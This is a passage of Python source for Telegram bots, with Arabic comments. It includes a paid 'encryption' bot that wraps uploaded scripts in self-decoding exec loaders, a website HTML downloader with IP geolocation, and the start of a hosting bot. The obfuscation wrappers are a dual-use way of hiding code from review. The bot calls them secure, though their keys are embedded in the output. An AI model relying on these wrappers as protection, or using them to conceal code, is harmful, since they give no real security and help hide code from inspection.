# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}

def hex_to_code(hex_string):
    return bytes.fromhex(hex_string)

encrypted_hex = "{en}"

if __name__ == "__main__":
    try:
        code_bytes = hex_to_code(encrypted_hex)
        exec(code_bytes.decode('utf-8', errors='ignore'))
    except Exception as e:
        print(f"🔢 Hex Decryption Error: {{e}}")"""
            
            elif name == 'xor':
                # تشفير XOR بسيط
                key = b'python_encrypt_bot_key_2024'
                xor_bytes = bytes([original_content[i] ^ key[i % len(key)] for i in range(len(original_content))])
                en = xor_bytes.hex()
                encoded_content = f"""# 🔐 Python Code - XOR Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: XOR Encryption (Advanced)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}
# 🔑 XOR Key: {key.decode('utf-8', errors='ignore')}

def xor_decrypt(encrypted_hex, key):
    encrypted_bytes = bytes.fromhex(encrypted_hex)
    return bytes([encrypted_bytes[i] ^ key[i % len(key)] for i in range(len(encrypted_bytes))])

encrypted_data = "{en}"
decryption_key = b'python_encrypt_bot_key_2024'

if __name__ == "__main__":
    try:
        decrypted = xor_decrypt(encrypted_data, decryption_key)
        exec(decrypted.decode('utf-8', errors='ignore'))
    except Exception as e:
        print(f"🎭 XOR Decryption Error: {{e}}")"""
            
            elif name == 'aes':
                # محاكاة AES (لتوضيح المبدأ)
                import hashlib
                from Crypto.Cipher import AES
                from Crypto.Util.Padding import pad
                import base64
                
                # مفتاح تشفير
                key = hashlib.sha256(b'python_encryption_secret').digest()
                cipher = AES.new(key, AES.MODE_CBC)
                ct_bytes = cipher.encrypt(pad(original_content, AES.block_size))
                iv = base64.b64encode(cipher.iv).decode('utf-8')
                ct = base64.b64encode(ct_bytes).decode('utf-8')
                
                encoded_content = f"""# 🔐 Python Code - AES Simulation Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: AES Simulation Encryption (Premium)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}
# ⚠️ Requires: pip install pycryptodome

import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_aes(encrypted_data, iv_base64):
    key = hashlib.sha256(b'python_encryption_secret').digest()
    iv = base64.b64decode(iv_base64)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_bytes = base64.b64decode(encrypted_data)
    decrypted = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
    return decrypted

encrypted_payload = "{ct}"
initialization_vector = "{iv}"

if __name__ == "__main__":
    try:
        decrypted_code = decrypt_aes(encrypted_payload, initialization_vector)
        exec(decrypted_code.decode('utf-8', errors='ignore'))
    except Exception as e:
        print(f"🛡️ AES Decryption Error: {{e}}")
        print("⚠️ Make sure to install: pip install pycryptodome")"""
            
            else:
                return None
            
            # حساب وقت التشفير
            encryption_time = time.time() - start_time
            
            # حفظ في السجل
            if user_id:
                log_entry = {
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'method': name,
                    'file_size': file_size,
                    'encryption_time': round(encryption_time, 3),
                    'file_hash': file_hash
                }
                
                if user_id not in encryption_history:
                    encryption_history[user_id] = []
                
                encryption_history[user_id].append(log_entry)
                # الاحتفاظ بآخر 50 عملية فقط
                if len(encryption_history[user_id]) > 50:
                    encryption_history[user_id] = encryption_history[user_id][-50:]
            
            return encoded_content, encryption_time, file_size
            
        except Exception as e:
            print(f"Error in encode_files: {e}")
            return None, 0, 0
    
    # ==================== دوال الواجهة المحسنة ====================
    def welcome(message):
        """واجهة ترحيبية متطورة"""
        user_id = message.from_user.id
        
        # زر القناة
        channel = InlineKeyboardButton('📢 قناة المطور', url='https://t.me/zxgbjji')
        
        # زر بدء التشفير
        start = InlineKeyboardButton('🚀 ابدأ التشفير', callback_data='start')
        
        # زر المطور
        programmer = InlineKeyboardButton('👨‍💻 المطور', url='https://t.me/ELZo_z')
        
        # زر الإحصائيات
        stats = InlineKeyboardButton('📊 إحصائياتي', callback_data='stats')
        
        # زر المساعدة
        help_btn = InlineKeyboardButton('❓ المساعدة', callback_data='help')
        
        # زر الميزات المتميزة
        premium = InlineKeyboardButton('💎 الميزات المتميزة', callback_data='premium')
        
        keyboards = InlineKeyboardMarkup()
        keyboards.row_width = 2
        keyboards.add(start, stats)
        keyboards.add(help_btn, premium)
        keyboards.add(channel, programmer)
        
        welcome_text = f"""🎭 **مرحباً بك في بوت التشفير المتطور!**

🔐 **معلومات حسابك:**
├ 👤 المستخدم: {message.from_user.first_name}
├ 🆔 الأيدي: `{user_id}`
└ 📅 تاريخ الدخول: {datetime.now().strftime("%Y-%m-%d")}

✨ **المميزات المتاحة:**
• 8️⃣ طرق تشفير مختلفة
• 🛡️ حماية متقدمة للأكواد
• 📊 تتبع إحصائي كامل
• ⚡ تشفير سريع وآمن
• 💾 حفظ سجل العمليات

🎯 **للبدء، اضغط على زر 'ابدأ التشفير'**"""
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=keyboards, parse_mode="Markdown")
    
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        welcome(message)
    
    @bot.message_handler(commands=['stats'])
    def show_stats_command(message):
        show_user_stats(message)
    
    @bot.message_handler(commands=['help'])
    def show_help_command(message):
        show_help(message)
    
    @bot.message_handler(commands=['premium'])
    def show_premium_command(message):
        show_premium_features(message)
    
    def encryption(message):
        """عرض واجهة اختيار طرق التشفير"""
        user_id = message.from_user.id
        is_premium = user_id in premium_users
        
        # إنشاء الأزرار
        buttons = []
        
        # طرق التشفير الأساسية (للجميع)
        basic_methods = ['base64', 'hex', 'lambda', 'marshal', 'zlib']
        
        for method in basic_methods:
            info = encryption_methods_info.get(method, {})
            btn_text = f"{info.get('name', method)} {info.get('security', '')}"
            buttons.append(InlineKeyboardButton(btn_text, callback_data=method))
        
        # طرق التشفير المتميزة
        if is_premium:
            premium_methods = ['base85', 'xor', 'aes']
            for method in premium_methods:
                info = encryption_methods_info.get(method, {})
                btn_text = f"💎 {info.get('name', method)} {info.get('security', '')}"
                buttons.append(InlineKeyboardButton(btn_text, callback_data=method))
        else:
            buttons.append(InlineKeyboardButton("🔒 قفل متميز - اشترك الآن", callback_data='premium'))
        
        # أزرار إضافية
        buttons.append(InlineKeyboardButton("📊 إحصائيات التشفير", callback_data='encryption_stats'))
        buttons.append(InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'))
        
        # تنظيم الأزرار في صفوف
        keyboard = InlineKeyboardMarkup()
        row_size = 2
        
        for i in range(0, len(buttons), row_size):
            row_buttons = buttons[i:i + row_size]
            keyboard.row(*row_buttons)
        
        status_text = "💎" if is_premium else "🆓"
        
        selection_text = f"""🔐 **اختر طريقة التشفير المناسبة**

{status_text} **حسابك:** {'متميز 💎' if is_premium else 'عادي 🆓'}

📋 **الطرق المتاحة:**
• 🟢 طرق أساسية (مجانية)
• 🔒 طرق متقدمة
• 💎 طرق متميزة (للمشتركين)

⚡ **معلومات الطرق:**
"""
        
        # إضافة معلومات عن كل طريقة
        for method, info in encryption_methods_info.items():
            if method in basic_methods or (is_premium and method in ['base85', 'xor', 'aes']):
                selection_text += f"├ {info['security']} **{info['name']}**: {info['level']} - {info['speed']}\n"
        
        selection_text += "\n🎯 **اختر طريقة من القائمة أدناه:**"
        
        bot.send_message(message.chat.id, selection_text, reply_markup=keyboard, parse_mode="Markdown")
    
    def show_user_stats(message):
        """عرض إحصائيات المستخدم"""
        user_id = message.from_user.id
        
        if user_id not in user_stats:
            stats_text = """📊 **إحصائياتك:**

⚠️ لم تقم بأي عمليات تشفير بعد!

🚀 ابدأ الآن باستخدام زر 'ابدأ التشفير'"""
        else:
            stats = user_stats[user_id]
            
            # حساب الطرق الأكثر استخداماً
            top_methods = sorted(stats['methods_used'].items(), key=lambda x: x[1], reverse=True)[:3]
            top_methods_text = "\n".join([f"  {i+1}. {encryption_methods_info.get(m, {}).get('name', m)}: {c} مرات" 
                                         for i, (m, c) in enumerate(top_methods)])
            
            stats_text = f"""📊 **إحصائياتك الكاملة:**

👤 **معلومات الحساب:**
├ 📅 آخر نشاط: {stats['last_activity']}
├ 🆔 أيديك: `{user_id}`
└ 💎 الحالة: {'متميز 💎' if user_id in premium_users else 'عادي 🆓'}

📈 **إحصائيات التشفير:**
├ 📂 عدد الملفات المشفرة: {stats['total_encrypted']}
├ 💾 الحجم الإجمالي: {stats['total_size'] / 1024:.1f} KB
└ ⏱️ متوسط الحجم: {stats['total_size'] / max(stats['total_encrypted'], 1) / 1024:.1f} KB

🏆 **الطرق الأكثر استخداماً:**
{top_methods_text}

📅 **سجل النشاط:**
"""
            
            # إضافة آخر 5 عمليات من السجل
            if user_id in encryption_history and encryption_history[user_id]:
                recent_ops = encryption_history[user_id][-5:]  # آخر 5 عمليات
                for i, op in enumerate(reversed(recent_ops)):
                    method_name = encryption_methods_info.get(op['method'], {}).get('name', op['method'])
                    stats_text += f"{i+1}. {method_name} - {op['file_size']} بايت - {op['timestamp']}\n"
            else:
                stats_text += "⚠️ لا توجد عمليات مسجلة بعد"
        
        # أزرار الإحصائيات
        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("🔄 تحديث الإحصائيات", callback_data='stats'),
            InlineKeyboardButton("🗑️ مسح السجل", callback_data='clear_stats')
        )
        keyboard.row(
            InlineKeyboardButton("📥 تصدير الإحصائيات", callback_data='export_stats'),
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main')
        )
        
        bot.send_message(message.chat.id, stats_text, reply_markup=keyboard, parse_mode="Markdown")
    
    def show_help(message):
        """عرض دليل المساعدة"""
        help_text = """❓ **دليل استخدام بوت التشفير المتطور**

🚀 **كيفية الاستخدام:**
1. اضغط على زر 'ابدأ التشفير'
2. اختر طريقة التشفير المناسبة
3. أرسل ملف Python (.py) الذي تريد تشفيره
4. استلم الملف المشفر جاهزاً للاستخدام

🔐 **معلومات طرق التشفير:**

**🟢 الطرق الأساسية (مجانية):**
• **Base64**: تشفير أساسي وسريع
• **Hex**: تحويل إلى ترميز ست عشري
• **Lambda**: تشفير باستخدام Lambda + Zlib
• **Marshal**: تشفير متقدم باستخدام Marshal
• **Zlib + Marshal**: تشفير مزدوج (Zlib + Marshal)

**💎 الطرق المتميزة:**
• **Base85**: تشفير Base85 المتقدم
• **XOR**: تشفير XOR مع مفتاح سري
• **AES**: محاكاة تشفير AES (يتطلب مكتبات إضافية)

📊 **الميزات الإضافية:**
• تتبع إحصائيات كاملة
• حفظ سجل العمليات
• عرض معلومات مفصلة
• دعم الملفات الكبيرة

⚠️ **ملاحظات هامة:**
• يدعم الملفات حتى 20MB
• الملفات المشفرة قابلة للتنفيذ مباشرة
• بعض الطرق تتطلب مكتبات إضافية
• احفظ نسخة من الملف الأصلي دائماً

📞 **للتواصل والدعم:**
@ELZo_z - المطور"""

        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("🚀 ابدأ الآن", callback_data='start'),
            InlineKeyboardButton("📊 إحصائياتي", callback_data='stats')
        )
        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'))
        
        bot.send_message(message.chat.id, help_text, reply_markup=keyboard, parse_mode="Markdown")
    
    def show_premium_features(message):
        """عرض الميزات المتميزة"""
        premium_text = """💎 **الميزات المتميزة - بوت التشفير**

✨ **ما تحصل عليه كمشترك متميز:**

**🔐 طرق تشفير حصرية:**
1. **Base85 Premium** - تشفير متقدم
2. **XOR Encryption** - تشفير بمفتاح سري
3. **AES Simulation** - محاكاة تشفير AES

**🚀 ميزات إضافية:**
• 📈 إحصائيات متقدمة
• 💾 سجل عمليات غير محدود
• ⚡ أولوية في المعالجة
• 📂 دعم ملفات أكبر حجماً
• 🛡️ تشفير إضافي للملفات

**🎁 عروض خاصة:**
• 👥 خصومات للمجموعات
• 📅 اشتراكات طويلة الأجل
• 🔄 تجديد تلقائي

💰 **الأسعار:**
• 📆 شهر واحد: 5 دولار
• 📆 3 أشهر: 12 دولار (توفير 20%)
• 📆 سنة كاملة: 40 دولار (توفير 33%)

📞 **للاشتراك والاستفسار:**
تواصل مع المطور: @ELZo_z

💼 **طرق الدفع:**
• 💳 باي بال
• 📱 تحويل بنكي
• 💎 عملات رقمية"""

        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("👨‍💻 تواصل مع المطور", url='https://t.me/ELZo_z'),
            InlineKeyboardButton("📢 قناة العروض", url='https://t.me/zxgbjji')
        )
        keyboard.add(InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'))
        
        bot.send_message(message.chat.id, premium_text, reply_markup=keyboard, parse_mode="Markdown")
    
    # ==================== معالجات Callback المتقدمة ====================
    @bot.callback_query_handler(func=lambda call: True)
    def callbacks_data(call):
        try:
            user_id = call.from_user.id
            
            if call.data == 'start':
                encryption(call.message)
                
            elif call.data == 'stats':
                show_user_stats(call.message)
                
            elif call.data == 'help':
                show_help(call.message)
                
            elif call.data == 'premium':
                show_premium_features(call.message)
                
            elif call.data == 'back_to_main':
                welcome(call.message)
                
            elif call.data == 'clear_stats':
                if user_id in user_stats:
                    user_stats[user_id] = {
                        'total_encrypted': 0,
                        'total_size': 0,
                        'methods_used': {},
                        'last_activity': None
                    }
                if user_id in encryption_history:
                    encryption_history[user_id] = []
                bot.answer_callback_query(call.id, "✅ تم مسح إحصائياتك بنجاح!")
                show_user_stats(call.message)
                
            elif call.data == 'export_stats':
                if user_id in user_stats:
                    # إنشاء تقرير نصي
                    stats = user_stats[user_id]
                    report = f"""📊 تقرير إحصائي - بوت التشفير
📅 تاريخ التصدير: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
👤 المستخدم: {call.from_user.first_name}
🆔 الأيدي: {user_id}

📈 الإحصائيات:
• عدد الملفات المشفرة: {stats['total_encrypted']}
• الحجم الإجمالي: {stats['total_size'] / 1024:.1f} KB
• آخر نشاط: {stats['last_activity'] or 'لا يوجد'}

🔐 الطرق المستخدمة:
"""
                    for method, count in stats['methods_used'].items():
                        method_name = encryption_methods_info.get(method, {}).get('name', method)
                        report += f"• {method_name}: {count} مرات\n"
                    
                    # حفظ التقرير في ملف مؤقت
                    report_file = f"stats_{user_id}_{int(time.time())}.txt"
                    with open(report_file, 'w', encoding='utf-8') as f:
                        f.write(report)
                    
                    # إرسال الملف
                    with open(report_file, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, caption="📊 تقرير إحصائياتك")
                    
                    # حذف الملف المؤقت
                    os.remove(report_file)
                else:
                    bot.answer_callback_query(call.id, "⚠️ لا توجد إحصائيات لتصديرها!")
                    
            elif call.data == 'encryption_stats':
                # عرض إحصائيات عامة عن التشفير
                total_users = len(user_stats)
                total_encrypted = sum([stats['total_encrypted'] for stats in user_stats.values()])
                total_size = sum([stats['total_size'] for stats in user_stats.values()])
                
                stats_text = f"""📊 **إحصائيات البوت العامة:**

👥 **المستخدمون:**
├ إجمالي المستخدمين: {total_users}
├ المستخدمون النشطون: {len([uid for uid, stats in user_stats.items() if stats['total_encrypted'] > 0])}
└ المستخدمون المتميزون: {len(premium_users)}

📈 **عمليات التشفير:**
├ إجمالي العمليات: {total_encrypted}
├ الحجم الإجمالي: {total_size / (1024*1024):.1f} MB
└ متوسط العمليات/مستخدم: {total_encrypted / max(total_users, 1):.1f}

🏆 **الطرق الأكثر شيوعاً:**
"""
                # حساب الطرق الأكثر استخداماً
                method_counts = {}
                for stats in user_stats.values():
                    for method, count in stats['methods_used'].items():
                        method_counts[method] = method_counts.get(method, 0) + count
                
                top_methods = sorted(method_counts.items(), key=lambda x: x[1], reverse=True)[:5]
                for i, (method, count) in enumerate(top_methods):
                    method_name = encryption_methods_info.get(method, {}).get('name', method)
                    stats_text += f"{i+1}. {method_name}: {count} عملية\n"
                
                bot.send_message(call.message.chat.id, stats_text, parse_mode="Markdown")
                
            elif call.data in encryption_methods_info:
                # التحقق من صلاحية الطريقة للمستخدم
                method = call.data
                is_premium_method = method in ['base85', 'xor', 'aes']
                
                if is_premium_method and user_id not in premium_users:
                    bot.answer_callback_query(call.id, "⚠️ هذه الطريقة للمشتركين المتميزين فقط!")
                    show_premium_features(call.message)
                    return
                
                info = encryption_methods_info[method]
                msg_text = f"""🔐 **طريقة التشفير المختارة: {info['name']}**

📋 **معلومات الطريقة:**
• 📊 المستوى: {info['level']}
• 🛡️ الأمان: {info['security']}
• ⚡ السرعة: {info['speed']}
• 📁 الناتج: ملف Python قابل للتنفيذ

📌 **ملاحظات:**
{get_method_notes(method)}

🚀 **الآن أرسل ملف Python (.py) الذي تريد تشفيره**
(الحد الأقصى: 20MB)"""
                
                msg = bot.send_message(call.message.chat.id, msg_text, parse_mode="Markdown")
                bot.register_next_step_handler(msg, lambda message: save_file(message, method, user_id))
                
        except Exception as ex:
            bot.send_message(call.message.chat.id, f"❌ حدث خطأ: {str(ex)}")
    
    def get_method_notes(method):
        """الحصول على ملاحظات خاصة بكل طريقة تشفير"""
        notes = {
            'base64': "• أبسط طريقة تشفير\n• مناسبة للملفات الصغيرة\n• سهلة القراءة والفحص",
            'hex': "• تحويل إلى ترميز ست عشري\n• حجم الملف يتضاعف تقريباً\n• سهلة الفك",
            'lambda': "• تستخدم Lambda functions\n• تضغط الملف باستخدام Zlib\n• متوسطة الصعوبة",
            'marshal': "• تستخدم Marshal module\n• تنشئ كود bytecode\n• صعبة القراءة",
            'zlib': "• مزيج من Zlib و Marshal\n• أعلى مستوى حماية\n• مثالية للملفات الحساسة",
            'base85': "💎 • تشفير Base85 متقدم\n💎 • حجم أقل من Base64\n💎 • حماية عالية",
            'xor': "💎 • تشفير XOR بمفتاح سري\n💎 • صعبة الفك بدون المفتاح\n💎 • سرعة معقولة",
            'aes': "💎 • محاكاة تشفير AES\n💎 • يتطلب pycryptodome\n💎 • أعلى مستوى أمان"
        }
        return notes.get(method, "• لا توجد ملاحظات خاصة")
    
    # ==================== دالة حفظ الملف المحسنة ====================
    def save_file(message, name, user_id):
        """معالجة وحفظ الملف مع التشفير"""
        try:
            if not message.document:
                bot.send_message(message.chat.id, "❌ لم يتم إرسال ملف!")
                return
            
            # التحقق من نوع الملف
            file_name = message.document.file_name
            if not file_name.endswith('.py'):
                bot.send_message(message.chat.id, "❌ يجب أن يكون الملف من نوع Python (.py) فقط!")
                return
            
            # التحقق من حجم الملف
            max_size = 50 * 1024 * 1024  # 50MB للمستخدمين المتميزين، 20MB للعاديين
            if user_id not in premium_users:
                max_size = 20 * 1024 * 1024  # 20MB
            
            if message.document.file_size > max_size:
                size_mb = max_size / (1024 * 1024)
                bot.send_message(message.chat.id, f"❌ حجم الملف كبير جداً! الحد الأقصى {size_mb}MB")
                return
            
            # إرسال رسالة الانتظار
            wait_msg = bot.send_message(message.chat.id, "⏳ جاري معالجة الملف...")
            
            # تحميل الملف
            file_info = bot.get_file(message.document.file_id)
            file_input = bot.download_file(file_info.file_path)
            
            # حفظ الملف مؤقتاً
            temp_file = f"temp_{user_id}_{int(time.time())}.py"
            with open(temp_file, 'wb') as f:
                f.write(file_input)
            
            # تشفير الملف
            bot.edit_message_text(
                f"🔐 جاري تشفير الملف باستخدام {encryption_methods_info[name]['name']}...",
                chat_id=message.chat.id,
                message_id=wait_msg.message_id
            )
            
            encoded, enc_time, file_size = encode_files(name, temp_file, user_id)
            
            if encoded:
                # حفظ الملف المشفر
                encrypted_file = f"encrypted_{name}_{int(time.time())}.py"
                with open(encrypted_file, 'w', encoding='utf-8') as f:
                    f.write(encoded)
                
                # إرسال الملف المشفر
                with open(encrypted_file, 'rb') as file_document:
                    caption = f"""✅ **تم تشفير الملف بنجاح!**

📋 **معلومات التشفير:**
• 🔐 الطريقة: {encryption_methods_info[name]['name']}
• 📁 الملف الأصلي: {file_name}
• 💾 الحجم الأصلي: {file_size / 1024:.1f} KB
• ⚡ وقت التشفير: {enc_time:.2f} ثانية
• 📊 رقم العملية: #{user_stats[user_id]['total_encrypted'] if user_id in user_stats else 1}
• 📅 التاريخ: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

✨ **ملاحظات:**
• الملف جاهز للتنفيذ
• احفظ نسخة احتياطية
• شارك النتيجة مع الأصدقاء"""

                    bot.send_document(
                        message.chat.id,
                        file_document,
                        caption=caption,
                        parse_mode="Markdown",
                        visible_file_name=f"encrypted_{file_name}"
                    )
                
                # تنظيف الملفات المؤقتة
                os.remove(temp_file)
                os.remove(encrypted_file)
                
                # إرسال إشعار نجاح
                bot.delete_message(message.chat.id, wait_msg.message_id)
                
                # إظهار أزرار إضافية
                keyboard = InlineKeyboardMarkup()
                keyboard.row(
                    InlineKeyboardButton("🔄 تشفير ملف آخر", callback_data='start'),
                    InlineKeyboardButton("📊 عرض الإحصائيات", callback_data='stats')
                )
                
                bot.send_message(
                    message.chat.id,
                    "🎉 **تمت العملية بنجاح!**\n\nماذا تريد أن تفعل الآن؟",
                    reply_markup=keyboard,
                    parse_mode="Markdown"
                )
                
                # إشعار خاص للمطور إذا كانت العملية كبيرة
                if file_size > 1024 * 1024:  # أكثر من 1MB
                    try:
                        bot.send_message(
                            owner_id,
                            f"📦 عملية تشفير كبيرة!\n"
                            f"👤 المستخدم: @{message.from_user.username or 'غير معروف'}\n"
                            f"🆔 الأيدي: {user_id}\n"
                            f"📄 الملف: {file_name}\n"
                            f"🔐 الطريقة: {name}\n"
                            f"💾 الحجم: {file_size / (1024*1024):.1f} MB\n"
                            f"⏱️ الوقت: {enc_time:.2f} ثانية"
                        )
                    except:
                        pass
                        
            else:
                bot.edit_message_text(
                    "❌ حدث خطأ أثناء التشفير!",
                    chat_id=message.chat.id,
                    message_id=wait_msg.message_id
                )
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    
        except Exception as ex:
            error_msg = f"❌ حدث خطأ غير متوقع:\n`{str(ex)[:300]}`"
            bot.send_message(message.chat.id, error_msg, parse_mode="Markdown")
            
            # تنظيف الملفات المؤقتة إن وجدت
            temp_files = [f for f in os.listdir() if f.startswith(f"temp_{user_id}_") or f.startswith(f"encrypted_")]
            for temp_file in temp_files:
                try:
                    os.remove(temp_file)
                except:
                    pass
    
    # ==================== بدء تشغيل البوت ====================
    try:
        bot_username = bot.get_me().username
        print(f'✅ Encryption bot @{bot_username} is now running...')
        print(f'👑 Owner: {owner_id}')
        print(f'📁 Data directory: {data_dir}')
        print(f'🔐 Available methods: {len(encryption_methods_info)}')
        print(f'💎 Premium users: {len(premium_users)}')
        
        # حذف أي Webhook قديم
        bot.remove_webhook()
        
        # بدء الاستماع للرسائل
        bot.infinity_polling(skip_pending=True, timeout=60)
        
    except Exception as ex:
        print(f'❌ Error in encryption bot: {ex}')
        if token in running_bot_threads:
            del running_bot_threads[token]
        raise ex

# ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت سحب ملفات المواقع (Website Files Downloader Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_website_downloader_bot(token, owner_id, data_dir):
    """
    تشغيل بوت سحب ملفات المواقع
    """
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    def get_geo_info(ip):
        """الحصول على الموقع الجغرافي لل IP"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = response.json()
            return data
        except:
            return {"country": "غير معروف", "org": "غير معروف", "city": "غير معروف", "isp": "غير معروف"}
    
    def create_decorated_message(text, style="normal"):
        """تزيين الرسائل بأنماط مختلفة"""
        styles = {
            "title": "╔═━━━━━ ✦ ━━━━━═╗\n     {}\n╚═━━━━━ ✦ ━━━━━═╝",
            "subtitle": "┌───────── ✦ ─────────┐\n    {}\n└───────── ✦ ─────────┘",
            "box": "╭─────────────╮\n   {}\n╰─────────────╯",
            "normal": "│ {} │"
        }
        return styles.get(style, "{}").format(text)
    
    def get_developer_info():
        """الحصول على معلومات المطور (صانع البوت)"""
        try:
            owner_info = bot.get_chat(owner_id)
            if hasattr(owner_info, 'username') and owner_info.username:
                return f"https://t.me/{owner_info.username}"
            else:
                return f"tg://user?id={owner_id}"
        except Exception as e:
            print(f"Error getting developer info: {e}")
            return f"tg://user?id={owner_id}"
    
    def download_html(url):
        """تحميل HTML من رابط"""
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            return response.text
        except Exception as e:
            print(f"Error downloading HTML: {e}")
            return None
    
    def log_new_user(user_id, username):
        """تسجيل المستخدم الجديد"""
        log_file = os.path.join(data_dir, "users.txt")
        
        try:
            if os.path.exists(log_file):
                with open(log_file, 'r', encoding='utf-8') as f:
                    users = [line.strip() for line in f.readlines()]
            else:
                users = []
            
            if str(user_id) not in users:
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"{user_id}\n")
                
                # إرسال تنبيه للأدمن (صانع البوت)
                try:
                    bot.send_message(
                        owner_id,
                        f"👤 دخل مستخدم جديد للبوت:\n\n🆔 ID: {user_id}\n💬 يوزر: {username}"
                    )
                except:
                    pass
                return True
        except Exception as e:
            print(f"Error logging user: {e}")
        
        return False
    
    # معالجة الأمر /start
    @bot.message_handler(commands=['start'])
    def start(message):
        user_id = message.from_user.id
        username = f"@{message.from_user.username}" if message.from_user.username else "بدون يوزر"
        
        # تسجيل المستخدم الجديد
        if user_id != owner_id:
            log_new_user(user_id, username)
        
        # الحصول على رابط المطور
        developer_link = get_developer_info()
        
        # إنشاء نص الترحيب
        welcome_text = create_decorated_message("بوت سحب ملفات المواقع", "title") + "\n\n"
        welcome_text += create_decorated_message("Website Files Downloader", "subtitle") + "\n\n"
        welcome_text += "📂 أرسل رابط أي موقع لأسحب لك ملفاته الرئيسية\n\n"
        welcome_text += "✨ المميزات:\n"
        welcome_text += "• سحب ملفات HTML\n• معلومات الموقع الجغرافي\n• تفاصيل السيرفر\n• حجم الملفات\n\n"
        welcome_text += "🚀 فقط أرسل الرابط وانتظر النتيجة!"
        
        # إنشاء Inline Keyboard
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        
        # زر المطور يوجه لصانع البوت
        btn1 = telebot.types.InlineKeyboardButton("@ELZo_z", url=developer_link, emoji="@ELZo_z")
        
        markup.add(btn1)
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
    
    # معالجة الرسائل النصية
    @bot.message_handler(func=lambda message: True)
    def handle_messages(message):
        text = message.text.strip()
        
        if text.startswith(('http://', 'https://')):
            # تحميل HTML
            html_content = download_html(text)
            if not html_content:
                bot.reply_to(message, "❌ فشل في تحميل الموقع. تأكد من الرابط.")
                return
            
            # حفظ الملف
            filename = "index.html"
            file_path = os.path.join(data_dir, filename)
            
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            try:
                # تحليل الرابط
                import socket
                from urllib.parse import urlparse
                
                parsed_url = urlparse(text)
                domain = parsed_url.hostname
                
                # محاولة الحصول على IP
                try:
                    ip = socket.gethostbyname(domain)
                except:
                    ip = domain
                
                # الحصول على الموقع الجغرافي
                geo = get_geo_info(ip)
                
                # حساب حجم الملف
                file_size = os.path.getsize(file_path)
                file_size_kb = round(file_size / 1024, 2)
                
                # إنشاء الرسالة
                current_time = datetime.datetime.now().strftime("%H:%M:%S %d-%m-%Y")
                
                msg = f"🌍 رابط الموقع: {text}\n\n"
                msg += f"📁 الملف:\n"
                msg += f"📄 الاسم: {filename}\n"
                msg += f"📦 الحجم: {file_size_kb} KB\n"
                msg += f"📃 النوع: text/html\n\n"
                
                msg += "🧰 معلومات تقنية:\n"
                msg += f"🔌 السيرفر: Array\n"
                msg += f"🔗 الاتصال: Array\n"
                msg += f"🕒 زمن الاستجابة: غير محدد\n\n"
                
                msg += f"📍 الموقع الجغرافي:\n"
                msg += f"🌎 الدولة: {geo.get('country', 'غير معروف')}\n"
                msg += f"🏙️ المدينة: {geo.get('city', 'غير معروف')}\n"
                msg += f"📡 IP: {ip}\n"
                msg += f"🏢 المزود: {geo.get('isp', geo.get('org', 'غير معروف'))}\n\n"
                
                msg += f"📅 الإنشاء: {current_time}\n"
                msg += f"🔁 التعديل: {current_time}\n\n"
                
                # إرسال الملف
                with open(file_path, 'rb') as file:
                    bot.send_document(
                        message.chat.id,
                        file,
                        caption=msg
                    )
                
                # تنظيف الملف المؤقت
                os.remove(file_path)
                
            except Exception as e:
                print(f"Error processing website: {e}")
                bot.reply_to(message, f"❌ حدث خطأ أثناء معالجة الموقع: {str(e)}")
                
        else:
            bot.reply_to(message, "⚠️ أرسل رابط موقع صحيح يبدأ بـ http:// أو https://")
    
    try:
        bot_username = bot.get_me().username
        print(f"✅ Website downloader bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Website downloader bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت الاستضافة (Python Hosting Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_hosting_bot(token, owner_id, data_dir):
    """
    تشغيل بوت رفع ملفات بايثون على استضافة مع نظام فحص الملفات
    """
    import telebot
    import re
    import os
    import subprocess
    import threading
    import requests
    import json
    import time
    from datetime import datetime
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    bot_script_name = None
    admin_id = str(owner_id)  # استخدام آيدي المالك كأدمن
    upload_buttons = {}
    
    # متغيرات نظام الفحص
    banned_files = set()
    maintenance_mode = False
    
    # متغيرات إضافية للمميزات الجديدة
    active_bots = {}  # تخزين البوتات النشطة
    user_states = {}  # تخزين حالات المستخدمين
    bot_settings = {}  # إعدادات البوت
    
    # دالة فحص الملفات الخارجية
    def scan_file_externally(file_content, file_name):
        """فحص الملف بواسطة API خارجي"""
        try:
